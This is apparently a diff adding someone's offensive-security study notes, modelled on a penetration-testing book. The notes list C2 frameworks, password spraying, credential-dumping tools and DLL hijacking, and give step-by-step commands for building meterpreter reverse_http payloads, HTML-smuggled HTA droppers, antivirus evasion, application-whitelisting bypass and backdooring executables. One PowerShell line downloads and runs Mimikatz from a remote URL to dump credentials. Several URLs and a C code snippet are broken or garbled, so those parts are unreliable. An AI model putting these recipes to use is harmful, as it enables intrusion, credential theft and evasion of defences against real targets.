@@ -1,0 +1,390 @@
+-----------------------------------------
+
+The Hacker PLaybook 3 
+
+Some links, tools and resources
+plus extra
+-----------------------------------------
+
+
+Nishang
+PowerShell Based ICMP Shell
+http://bit.ly/2GXhdnZ
+And others
+https://github.com/jamesbarlow/icmptunnel
+https://github.com/DhavalKapil/icmptunnel
+http://code.gerade.org/hans/
+
+More on Nishang
+A framework and collection of PowerShell scripts and payloads
+Some of wich enaable lightweight Command and Control
+
+P0wnedShell
+An offensive PowerShell host written in C#
+https://github.cm/Cn33liz/p0nedShell
+
+Post exploitation and lateral movement
+PoshC2 is a "proxy aware C2 framework written in PowerShell
+https://github.com/nettitude/PoshC2
+
+
+Password Spraying
+http://bit.ly/2EJve6N
+
+Usage:
+spray.sh -owa <target ip> <usernamelist> <passwordlist> <AttemptsPerlockout> <LockoutPeriodMinutes> <Domain
+
+https://github.com/SpiderLabs/Responder
+
+https://github.com/gentilkiwi/mimikatz
+
+https://github.computterpanda/mimikittenz
+
+https://www.shellintel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
+
+Obsfucate payloads within MS Docs
+https://github.com/Pepitoh/VBad
+
+Non Macro Office Files
+
+
+https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+
+https://github.com/bhdresh/CVE-2017-0199
+
+https://rhinosecuritylabs/research/abusing-microsoft-wordfeatures-phishing-subdoc/
+
+Hide Encrypted Payloads
+
+ 404 Not Found: 
+Move somewhere else??
+
+   https://github.com/Arno0x/EmbedInHTML
+  cd /opt/EmbedInHTML
+  python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html
+
+https://github.com/nccgroup/demiguise
+	python demiguise.py -k hello -c cmd.exe /c
+	<pershell_cmd_here>" -p Outlook.Application -o test.hta
+
+Key Logger FRamework
+http://bit.ly/2qBEzsC
+
+Initial Skeleton code for hooking a keyboard
+https://github.com/cheetz/ceylogger/blob/master/skeleton
+
+----------------------------------------------------------------------------------
+#Obsfucation:
+#Bypass AV
+#Create a rotation cipher. This code has a basic decrypt function.
+#moves all strings by 6 chars.(ROT6).
+
+  init decrypt(const char* string, char result[]){
+	init key = 6;
+	int len = strlen(string);
+
+	for(int n = 0;n < len;n ++){
+	    int symbol = string[n];
+	    int e_symbol = symbol - key;
+	    result[n] = e_symbol;
+
+	}
+	result[len] = '\0`;
+
+	return 0;
+
+}
+
+
+#Example at
+#https://github.com/cheetz/ceylogger/tree/master/version2
+
+-----------------------------------------------------------------------------------
+#################################################################################
+
+THP Custom Dropper Code:
+https://github.com/cheetz/thpDropper.git
+
+shell code avail at
+shellstorm.org
+
+Running the Server
+
+For first time compiling
+
+cd /opt
+sudo apt-get install build-essential libssl-dev cmake git
+git clone https://github.com/cheetz/thpDropper.git
+cd thpDropper/thp
+mkdir build
+cd build
+cmake
+make
+
+For subsequent compiling just do:
+cd /opt/thpd/build
+make
+
+
+To run the server after you complile it
+./thpd [path to shell code/DLL][loadtype]
+
+-----------------------------------------------------------------------------
+|  0  | Shellcode   |  this will send raw shellcode bytes to the client     |
+|---------------------------------------------------------------------------|
+|     |     |       |                                                       |
+|  1  | DLL |       |   This will send a normal DLL file to be reflectively |
+|     |	    |       |   loaded in the client                                |
+-----------------------------------------------------------------------------
+
+#####################################################################################
+---------------------------------------------------------------------------------------
+
+Generate shell code payloads using meterpreter
+ 
+ * msfvenom -a x64 -p windows/x64/meterpreter/reverse_http
+   LHOST=< your_IP> LPORT=4444 EnableStageEncoding=True -f c
+
+start server
+	
+	.thpd./shellcode.txt 0
+
+For DLL payloads
+
+*  msfvenom -a x64 -p windows/x64/meterpreter/reverse_http
+   LHOST= 192.168.1.6 LPORT=4444 EnableStageEncoding=True -f > msf.dll
+
+start server
+
+	.thpd./msf.dll
+
+Recompile Metasploit/Meterpreter to bypass AV and Network Detection
+
+Compilling metserv (ntwrk service wrapper)
+http://bit.ly/2H2kaUB
+
+
+Modifying payloads
+http://bit.ly/2IS9HvI
+
+Modified Reflective DLL Injection to remove strings
+http:////bit.ly/2qyWfFK
+
+Go through all ruby files for different payload types and add random nop sleds to avoid detection
+http://bit.ly/2JKUhdx
+
+Custom Stage0 Payload:
+http://bit.ly/2ELYkm8
+
+
+
+Creating payloads and stagers
+https://github.com/mdsecactivebreach/CACTUSTORCH
+
+
+
+Sharpshooter
+https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/
+
+python SharpShooter.py --interactive
+1 - For .NET v2
+Y - Staged Payload
+1 - HTA Payload
+
+--anti sandbox techniques---
+
+[1] key to domain
+[2] ensure domain joined
+[3] check fpr sandbox artifacts
+[4] check for bad MACs
+[5] check for debugging
+
+*  1 - Web Delivery
+*  Y - builtin shellcode template
+*      Shellcode as a byte array
+
+
+in Terminal and create a C# Meterpreter payload:
+
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_http
+LHOST= 192.168.1.6 LPORT=8080 EnableStageEncoding=True 
+StageEncoder=x86/shikata_ga_nai -f csharp
+
+* copy everything between the "{ and "}" and submitt as the 
+  byte array
+
+* Provide URL for CSharp web delivery
+  put in your attacker IP/port and file..for example
+  http://192.168.1.6/malware.payload
+
+*name the output file
+	malware
+Y - Do you want to smuggle inside HTML?
+*   Use a custom (1) or predefined (2) template
+        * for testing, choose any of the predefined templates
+*Move the newly created malicious files to your web directory
+     mv output /* /var/www/html
+
+Set up a meterpreter handler for paayload
+
+After configuring and developing your paayload move it to your web directory
+(malware.hta, malware.html, malware.payload)
+
+Social engineer targer to visit your malicious web site
+
+when the target connects using IE/Edge, the HTA automatically downloads aand prompts to run
+after prompted and selected to run the stager payload will run download the secondaary payload (if the sansdbox conmtrols are meet) and execute our meterpreter payload in memory
+
+https://mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/
+
+https://github.com/mdsecactivebreach/SharpShooter
+
+
+Application whitelisting
+https://github.com/GreatSCT/GreatSCT.git
+
+git clone https://github.com/GreatSCT/GreatSCT.git /opt/ 
+
+cd /opt/GreatSCT/
+cd setup
+python3 ./gr8sct.py
+[4] MSBUILD/msbuild.cfg
+Enteryour host IP[0] Aand port[1]
+generate
+(then set up a Windows meterpreter sesh)
+
+windows/meterpreter/reverse_http handles in Metasploit
+
+Backdoring executables
+
+https://www.securitynewspaper.com/2019/06/20/create-windows-10-fud-fully-undetectable-payload/
+https://haiderm.com/fully-undetectable-backdooring-pe-file/
+
+https://github.com/wetw0rk/Introduction-To-Manual-Backdooring
+
+
+Powershell Invoke Obsfucation:
+1st Get a Windows 10 VM
+https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
+
+Then, on Windows, download and install cmder
+an upgraded console & command line interpreter
+https://cmder.net/
+This makes git clone much easer and you can use VIM
+
+then download the Invoke Powershells
+https://github.com/danielbohannon/Invoke-Obfuscation
+
+ Import-Module ./Invoke-Obsfucation
+ Invoke-Obsfication
+
+Set the powershell script you want to Obsfucate
+(such as dumping hashes from mimikatz)
+
+    SET SCRIPTBLOCK Invoke-Expression(New-Object
+     Net.WebClient).DownloadString('http://bit.ly/2HVdzf'); Invoke-
+     Mimikatz -DumpCreds
+
+Encode the payload
+     ENCODING
+Example: SecureString (AES)
+
+  
+Encode the Payload
+ENCODING
+
+
+----------------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------------------
+Some links, tools and github repos I've found to be useful
+
+https://gbhackers.com/external-penetration-testing/
+
+https://www.blackarch.org/tools.html
+
+git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
+
+https://www.blackarch.org/tools.html
+
+https://github.com/thegsoinfosec
+
+https://github.com/mrjamiebowman
+
+https://github.com/LinuxUser255/
+
+https://github.com/hacktronian/hacktronian
+
+------------------------------------------------------------------------------------
+https://github.com/monoxgas/Koppeling
+https://github.com/monoxgas/sRDI
+
+Adaptive DLL Hijacking
+
+Nick Landers
+@monoxgas
+
+
+Adaptive DLL Hijacking
+
+https://silentbreaksecurity.com/adaptive-dll-hijacking/
+
+
+more info:
+
+    https://resources.infosecinstitute.com/dll-hijacking-attacks-revisited/
+    https://pentestlab.blog/2017/03/27/dll-hijacking/
+    https://liberty-shell.com/sec/2019/03/12/dll-hijacking/
+    https://astr0baby.wordpress.com/2018/09/08/understanding-how-dll-hijacking-works/
+    https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862085.pdf
+    https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992
+
+
+
+In addition, some tooling designed to discover/exploit hijacks:
+
+    https://github.com/cys3c/Siofra [https://github.com/Cybereason/siofra]
+    https://github.com/cyberark/DLLSpy
+    https://github.com/MojtabaTajik/Robber
+
+
+Function Proxying:
+
+
+    https://itm4n.github.io/dll-proxying/
+    https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf
+    https://www.shysecurity.com/post/20130111-Dll%20Proxy
+    https://kevinalmansa.github.io/application%20security/DLL-Proxying/
+    https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html
+    https://www.synack.com/blog/dll-hijacking-in-2014/
+
+some projects that implement these methods:
+
+    https://github.com/kevinalmansa/DLL_Wrapper
+    https://github.com/maluramichael/dll-proxy-generator
+    https://github.com/oranke/proxy-dll-generator
+    https://github.com/mcryptzzz/ProxyDllGenerator
+    https://github.com/advancedmonitoring/ProxyDll
+    https://www.codeproject.com/Articles/1179147/ProxiFy-Automatic-Proxy-DLL-Generation
+    https://www.codeproject.com/Articles/16541/Create-your-Proxy-DLLs-automatically
+
+
+Stack Patching
+
+An equally elegant, but more dynamic approach is to walk the stack backward from DllMain and replace the return value for the LoadLibrary call above us with a different module handle. As a result, any future calls to lookup functions will simply bypass us completely. It should be no surprise to the reader at this point, but this technique will only work for dynamic sinks. With static sinks, the LDR subsystem has already validated our export table and patched IATs with its values, nor does it care what we have to say about module handles.
+
+Preempt mentions this in a post about Vault 7 techniques, but they don’t go into much detail. Luckily we’re crazy enough to try this stuff, so we’ve written a small PoC which should demo the trick nicely for anyone who wants to run with it.
+
+https://gist.github.com/monoxgas/b8a87bec4c4b51d8ac671c7ff245c812
+
+
+Hooking for Stability
+https://gist.github.com/monoxgas/5027de10caad036c864efb32533202ec
+
+
+Koppeling
+https://github.com/monoxgas/Koppeling
+
+
+sRDI - Shellcode Reflective DLL Injection
+https://github.com/monoxgas/sRDI
